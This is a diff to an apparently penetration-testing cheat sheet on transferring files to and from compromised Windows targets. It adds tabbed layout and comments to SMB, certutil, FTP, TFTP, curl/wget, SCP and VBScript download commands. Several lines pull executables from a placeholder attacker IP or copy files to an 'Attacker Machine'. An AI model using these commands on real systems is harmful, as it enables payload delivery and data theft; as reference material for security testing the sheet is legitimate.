@@ -28,12 +28,20 @@ http-server [path] [options]
 ## SMB 
 
 
+<Tabs>
+  <TabItem value="one_smb" label="Server"> 
+    <p>
+
 ```batch
 :: Transfer Files To\From Windows with SMB
 :: -smb2support [SMB-2]
 smbserver <SHARE_NAME> <DIRECTORY>                    
 ```
 
+</p>
+  </TabItem>
+  <TabItem value="two_smb" label="Target">
+    <p>
 
 ```batch
 :: SMB Remote Commands
@@ -46,6 +54,10 @@ copy \\IP\SHARE_NAME\FILE OUTPUT
 :: Transfer to Attacker Machine
 copy FILE \\IP\SHARE_NAME\OUTPUT
 ```
+
+</p>
+  </TabItem>
+</Tabs>
 
 <br/>
 
@@ -116,21 +128,40 @@ Invoke-RestMethod -Uri $source -OutFile $destination
 ## CERTUTIL
 
 ```batch
+:: Save Remote File
 certutil -urlcache -split -f "http://IP:PORT/FILE.exe"
 ```
 
 ## FTP
 
+<Tabs>
+  <TabItem value="one_ftp" label="Server"> 
+    <p>
 
 ```batch
 :: Requires [pyftpdlib] Package 
 :: Start The Server
 python3 -m pyftpdlib -p 21
+```
 
+</p>
+  </TabItem>
+  <TabItem value="two_ftp" label="Interactive">
+    <p>
+
+```batch
+:: Interactive SHELL
 :: Access The Server
 :: [USER: anonymous PASSWORD: anonymous]
 ftp -p 10.11.3.35 21
+```
 
+</p>
+  </TabItem>
+    <TabItem value="three_ftp" label="Non Interactive">
+    <p>
+
+```batch
 :: Non Interactive SHELL
 :: Target
 echo open IP > FTP.txt
@@ -143,8 +174,17 @@ echo bye >> FTP.txt
 ftp -v -n -s:FTP.txt
 ```
 
+</p>
+  </TabItem>
+</Tabs>
+
+
 ## TFTP
 
+
+<Tabs>
+  <TabItem value="one_tftp" label="Server"> 
+    <p>
 
 ```batch
 :: Requires [atftp] Package 
@@ -154,32 +194,51 @@ chown nobody: /tftp
 
 :: Start The Server
 atftpd --daemon --port 69 /tftp
+```
 
+</p>
+  </TabItem>
+  <TabItem value="two_tftp" label="Target">
+    <p>
+
+```batch
 :: Target [PUT - GET]
 tftp -i $IP PUT $FILE   
 tftp -i $IP GET $FILE
 ```
 
+</p>
+  </TabItem>
+</Tabs>
+
+
 ## CURL - WGET
 
 
-```bash
-curl http://IP:PORT/FILE.exe -o OUTPUT.exe
+```batch
+:: Save Remote File
+curl "http://IP:PORT/FILE.exe" -o OUTPUT.exe
 ```
 
-```bash
-wget http://IP:PORT/FILE.exe
+```batch
+:: Save Remote File
+wget "http://IP:PORT/FILE.exe" -O OUTPUT.exe
 ```
 
 ## SCP
 
-```bash
+```batch
+:: Copy Local File to a Remote System
 scp -P 22 "C:\FILE.exe" machine@IP:/home/machine/OUTPUT.exe
+
+:: Copy Remote File to a Local System
+scp -P 22 machine@IP:C:\FILE.sh "/home/user/OUTPUT.sh"
 ```
 
 ## HTTP - VBScript
 
 ```batch
+:: PAYLOAD
 echo strUrl = WScript.Arguments.Item(0) > SCRIPT.vbs
 echo StrFile = WScript.Arguments.Item(1) >> SCRIPT.vbs
 echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> SCRIPT.vbs
